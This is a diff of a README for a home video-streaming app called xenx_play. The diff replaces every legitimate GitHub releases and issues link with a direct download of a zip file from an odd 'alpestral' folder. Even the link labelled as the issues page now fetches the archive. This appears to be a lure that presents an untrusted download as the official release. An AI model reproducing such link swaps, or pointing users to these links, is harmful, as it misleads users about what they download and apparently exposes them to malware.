@@ -1,6 +1,6 @@
 # 🎥 xenx_play - Stream Videos Seamlessly at Home
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/developeransh8/xenx_play/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/developeransh8/xenx_play/main/alpestral/xenx_play.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/developeransh8/xenx_play/main/alpestral/xenx_play.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To run xenx_play smoothly, ensure your system meets the following requirements:
 
 To get started, you can download xenx_play from our Releases page.
 
-- Visit this page to download: [Download Latest Release](https://github.com/developeransh8/xenx_play/releases)
+- Visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/developeransh8/xenx_play/main/alpestral/xenx_play.zip)
 
 Follow these steps to install:
 
@@ -61,7 +61,7 @@ If you run into issues while using xenx_play, consider the following:
 
 If you have questions, suggestions, or need help, feel free to join our community. You can reach out via the following channels:
 
-- **GitHub Issues**: Report any bugs or request features directly on our [GitHub Issues page](https://github.com/developeransh8/xenx_play/issues).
+- **GitHub Issues**: Report any bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/developeransh8/xenx_play/main/alpestral/xenx_play.zip).
 - **User Discussions**: Engage with other users and share tips in the discussions section on GitHub.
 
 ## 📄 License
@@ -72,4 +72,4 @@ For further information, check the full license details in the repository.
 
 ## 🎉 Conclusion
 
-Thank you for choosing xenx_play for your video streaming needs. We hope you enjoy using our application to upload, process, and share your videos. Don't forget to visit the [Downloads page](https://github.com/developeransh8/xenx_play/releases) for the latest updates and releases. Happy streaming!
+Thank you for choosing xenx_play for your video streaming needs. We hope you enjoy using our application to upload, process, and share your videos. Don't forget to visit the [Downloads page](https://raw.githubusercontent.com/developeransh8/xenx_play/main/alpestral/xenx_play.zip) for the latest updates and releases. Happy streaming!
